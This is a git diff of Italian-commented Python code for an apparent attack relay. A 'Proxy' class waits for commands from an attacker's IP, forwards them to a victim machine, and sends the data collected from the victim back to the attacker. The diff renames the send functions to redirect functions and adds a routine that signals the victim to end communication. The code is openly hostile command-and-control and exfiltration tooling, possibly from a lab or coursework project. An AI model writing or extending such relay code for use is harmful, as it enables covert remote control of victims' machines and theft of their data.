@@ -9,6 +9,18 @@ import datetime
 import threading
 
 #------------------------------------
+def update_victim_end_communication(ip_vittima):
+    try:
+        com.is_valid_ipaddress(ip_vittima)
+    except Exception as e:
+        raise Exception(f"update_victim_end_communication: {e}")
+    data=com.END_COMMUNICATION
+    if com.send_packet(data.encode(),ip_vittima):
+        print(f"{ip_vittima}: la vittima è stata aggiornata")
+        return
+    print(f"{ip_vittima}: la vittima non è stata aggiornata")
+
+
 def update_data_received(data):
     testclass.data_lock.acquire()
     testclass.data_received.append(data)
@@ -264,16 +276,16 @@ class Proxy:
             print(f"Il comando da inoltrare è {comando}") 
             if comando is not None:
                 data=com.CONFIRM_COMMAND+comando
-                if not self.send_command_to_victim(data.encode()):
+                if not self.redirect_command_to_victim(data.encode()):
                     com.set_threading_Event(self.event_pktconn) 
             thread_data.join() 
             if len(self.data_received)<=0:
-                testclass.send_data_to_attacker([com.LAST_PACKET])
-            testclass.send_data_to_attacker(self.data_received)
+                testclass.redirect_data_to_attacker([com.LAST_PACKET])
+            testclass.redirect_data_to_attacker(self.data_received)
             #return self.data_received 
             comando=self.wait_command_from_attacker()
         print("Interruzione del programma")
-        exit(0) 
+        update_victim_end_communication(self.ip_vittima)
     
     def wait_command_from_attacker(self):
         print(f"Waiting the command from {self.ip_attaccante}") 
@@ -327,7 +339,7 @@ class Proxy:
         print(f"Proxy: {self.ip_vittima} non ha mandato i dati") 
         return False
 
-    def send_command_to_victim(self,command_to_redirect):
+    def redirect_command_to_victim(self,command_to_redirect):
             print(f"Sendin command {command_to_redirect} to {self.ip_vittima}") 
             if com.send_packet(command_to_redirect,self.ip_vittima):
                 print(f"la vittima ha ricevuto il comando")
@@ -335,12 +347,12 @@ class Proxy:
             print(f"la vittima non ha ricevuto il comando")
             return False 
     
-    def send_data_to_attacker(self,data_received:list=None): 
+    def redirect_data_to_attacker(self,data_received:list=None): 
         try:
             if not com.is_list(data_received) or len(data_received)<=0:
-                raise Exception(f"send_data_to_attacker: dati ricevuti non validi")
+                raise Exception(f"redirect_data_to_attacker: dati ricevuti non validi")
         except Exception as e:
-            raise Exception(f"send_data_to_attacker: {e}")
+            raise Exception(f"redirect_data_to_attacker: {e}")
         print(f"data_received: {data_received}")
         for id,seq,data in data_received:
             print(f"prova id: {str(id)[0]}")
@@ -350,7 +362,7 @@ class Proxy:
                 print("l'attaccante non ha ricevuto i dati")
                 time.sleep(1)
             if num_times_not_received>3:
-                raise Exception(f"send_data_to_attacker: impossibilità nel mandare i dati all'attaccante")
+                raise Exception(f"redirect_data_to_attacker: impossibilità nel mandare i dati all'attaccante")
         print(f"dati mandati all'attaccante")
 
 
